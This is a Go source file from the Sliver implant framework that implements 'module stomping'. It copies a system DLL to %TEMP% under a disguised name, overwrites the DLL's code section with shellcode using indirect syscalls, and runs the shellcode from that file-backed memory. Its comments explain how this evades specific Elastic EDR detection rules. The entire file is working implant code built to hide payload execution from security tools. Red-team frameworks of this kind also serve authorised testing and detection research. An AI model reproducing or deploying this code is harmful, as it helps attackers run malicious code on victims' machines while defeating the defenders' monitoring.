package evasion

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// Module stomping — local shellcode execution from file-backed (MEM_IMAGE)
// memory instead of MEM_PRIVATE.
//
// EDR call-stack and memory provenance analysis flags executable regions
// with no backing file ("unbacked memory" — the signal behind Elastic rules
// like `unbacked_shellcode_from_unsigned_module`). Classic VirtualAlloc-based
// execution always produces MEM_PRIVATE pages. Stomping overwrites the .text
// of a loaded DLL decoy, so the payload executes from a MEM_IMAGE region and
// every stack frame points at a plausible, signed module.
//
// Technique validated against Elastic Defend at the DEF CON 34 workshop
// (tyeurada/edrEvasionWorkshop): stomping a DLL from OUTSIDE System32/
// SysWOW64 evades `image_hollow_from_unusual_stack`, which only scopes
// system paths (and writes >= 10000 bytes). If no decoy path is supplied,
// we copy a system DLL to %TEMP% first — the copy is outside the rule's
// regex scope.
//
// All privileged transitions (protect/write-protect/thread) go through the
// Nt* indirect-syscall layer in nt_injection_windows.go.

import (
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"unsafe"

	//{{if .Config.Debug}}
	"log"
	//{{end}}

	"golang.org/x/sys/windows"
)

// sysDllSource is the decoy source copied to %TEMP% when no path is given.
// combase.dll (~0.9 MB .text) comfortably fits implant shellcode.
const sysDllSource = `C:\Windows\System32\combase.dll`

// decoySources — candidates tried in order. A decoy that is ALREADY loaded in
// the process (under its System32 path) will have its DllMain re-executed when
// the %TEMP% copy is LoadLibrary'd, and runtime DLLs like combase FAIL on
// double-init ("DLL initialization routine failed") — e.g. after the CLR host
// (execute_assembly) pulls COM into the process. mscms/dbgcore have trivial
// DllMains and are not pulled in by the Go runtime, so they come first.
var decoySources = []string{
	`C:\Windows\System32\mscms.dll`,
	`C:\Windows\System32\dbgcore.dll`,
	sysDllSource, // combase: large .text, last resort
}

// StompResult reports where the payload was placed and executed from.
type StompResult struct {
	DllPath      string
	TextBase     uintptr
	TextSize     uintptr
	ThreadHandle windows.Handle
}

// ModuleStompExecute runs shellcode from the .text section of a decoy DLL.
//
//	dllPath == "" → a system DLL is copied to %TEMP%\<random>.dll first
//	(non-system32 path = outside Elastic image_hollow rule scope).
//
// Steps: LoadLibrary decoy → locate .text (must be >= shellcode size) →
// NtProtect RW (indirect syscall) → copy shellcode → NtProtect restore RX →
// NtCreateThread (gadget) at the stomped address.
func ModuleStompExecute(data []byte, dllPath string) (*StompResult, error) {
	if len(data) == 0 {
		return nil, errors.New("ModuleStomp: empty payload")
	}
	if err := ntInit(); err != nil {
		return nil, err
	}

	// 0. Materialize a decoy DLL outside System32 if none supplied.
	// Multiple candidates are tried: a decoy already initialized in the
	// process fails LoadLibrary on double-init and we move to the next.
	var loadErrs []string
	if dllPath == "" {
		for _, src := range decoySources {
			p, err := stageDecoyDLLFrom(src)
			if err != nil {
				loadErrs = append(loadErrs, fmt.Sprintf("stage %s: %v", src, err))
				continue
			}
			hMod, err := winLoadLibrary(p)
			if err != nil {
				loadErrs = append(loadErrs, fmt.Sprintf("LoadLibraryW(%s): %v", p, err))
				continue
			}
			//{{if .Config.Debug}}
			log.Printf("[ModuleStomp] decoy %s mapped at 0x%x\n", p, uintptr(hMod))
			//{{end}}
			dllPath = p
			return stompIntoModule(data, dllPath, uintptr(hMod))
		}
		return nil, fmt.Errorf("ModuleStomp: all decoy candidates failed: %s", strings.Join(loadErrs, "; "))
	}

	// 1. Map the decoy as MEM_IMAGE (explicit path supplied by the caller)
	hMod, err := winLoadLibrary(dllPath)
	if err != nil {
		return nil, fmt.Errorf("LoadLibraryW(%s): %w", dllPath, err)
	}
	return stompIntoModule(data, dllPath, uintptr(hMod))
}

// stompIntoModule performs steps 2-6 of ModuleStompExecute against an
// already-mapped decoy module.
func stompIntoModule(data []byte, dllPath string, base uintptr) (*StompResult, error) {

	// 2. Parse PE headers → find .text
	dosMagic := *(*uint16)(unsafe.Pointer(base))
	if dosMagic != 0x5A4D {
		return nil, errors.New("ModuleStomp: invalid DOS header in decoy")
	}
	peOffset := uintptr(*(*int32)(unsafe.Pointer(base + 0x3C)))
	if *(*uint32)(unsafe.Pointer(base + peOffset)) != 0x00004550 {
		return nil, errors.New("ModuleStomp: invalid PE signature in decoy")
	}
	coff := base + peOffset + 4
	numSections := *(*uint16)(unsafe.Pointer(coff + 2))
	optHeaderSize := uintptr(*(*uint16)(unsafe.Pointer(coff + 16)))
	sections := coff + 20 + optHeaderSize

	var (
		textBase uintptr
		textSize uintptr
	)
	for i := uint16(0); i < numSections; i++ {
		sec := sections + uintptr(i)*40 // sizeof(IMAGE_SECTION_HEADER)
		name := *(*uint64)(unsafe.Pointer(sec))
		// ".text\0\0\0" little-endian
		if name != 0x00007865742e {
			continue
		}
		textBase = base + uintptr(*(*uint32)(unsafe.Pointer(sec + 12)))
		textSize = uintptr(*(*uint32)(unsafe.Pointer(sec + 8)))
		break
	}
	if textBase == 0 {
		return nil, errors.New("ModuleStomp: decoy has no .text section")
	}
	if textSize < uintptr(len(data)) {
		return nil, fmt.Errorf("ModuleStomp: decoy .text (%d bytes) smaller than payload (%d bytes)", textSize, len(data))
	}

	//{{if .Config.Debug}}
	log.Printf("[ModuleStomp] decoy=%s .text=0x%x size=%d payload=%d bytes\n", dllPath, textBase, textSize, len(data))
	//{{end}}

	// 3. RW (indirect syscall — current process handle = -1)
	curProc := uintptr(^uintptr(0)) // NtCurrentProcess
	rwBase, rwSize := textBase, textSize
	var oldProtect uint32
	if err := ntCall("NtProtectVirtualMemory",
		curProc,
		uintptr(unsafe.Pointer(&rwBase)),
		uintptr(unsafe.Pointer(&rwSize)),
		uintptr(pageReadWrite),
		uintptr(unsafe.Pointer(&oldProtect)),
	); err != nil {
		return nil, fmt.Errorf("NtProtectVirtualMemory(RW): %w", err)
	}

	// 4. Stomp — overwrite the start of .text with the payload
	for i, b := range data {
		*(*byte)(unsafe.Pointer(textBase + uintptr(i))) = b
	}

	// 5. Restore the original RX protection (page-aligned region returned above)
	rxBase, rxSize := rwBase, rwSize
	if err := ntCall("NtProtectVirtualMemory",
		curProc,
		uintptr(unsafe.Pointer(&rxBase)),
		uintptr(unsafe.Pointer(&rxSize)),
		uintptr(pageExecRead),
		uintptr(unsafe.Pointer(&oldProtect)),
	); err != nil {
		return nil, fmt.Errorf("NtProtectVirtualMemory(RX restore): %w", err)
	}

	// 6. Execute from the file-backed region (gadget-dispatched NtCreateThread,
	// current process). Caller owns the thread handle.
	thread, err := NtCreateThreadRemote(windows.Handle(curProc), textBase)
	if err != nil {
		return nil, fmt.Errorf("NtCreateThread in stomped region: %w", err)
	}

	//{{if .Config.Debug}}
	log.Printf("[ModuleStomp] executing from MEM_IMAGE at 0x%x (thread=0x%x)\n", textBase, thread)
	//{{end}}

	return &StompResult{
		DllPath:      dllPath,
		TextBase:     textBase,
		TextSize:     textSize,
		ThreadHandle: thread,
	}, nil
}

// stageDecoyDLLFrom copies the given decoy source DLL to %TEMP% with a
// random-looking name. The copy lands OUTSIDE System32/SysWOW64 — outside the
// regex scope of Elastic's image_hollow_from_unusual_stack rule.
func stageDecoyDLLFrom(src string) (string, error) {
	tmp := os.TempDir()
	dst := filepath.Join(tmp, "dxgi_cache.dll")
	data, err := os.ReadFile(src)
	if err != nil {
		return "", fmt.Errorf("read decoy source %s: %w", src, err)
	}
	if err := os.WriteFile(dst, data, 0o644); err != nil {
		return "", fmt.Errorf("write decoy %s: %w", dst, err)
	}
	return dst, nil
}
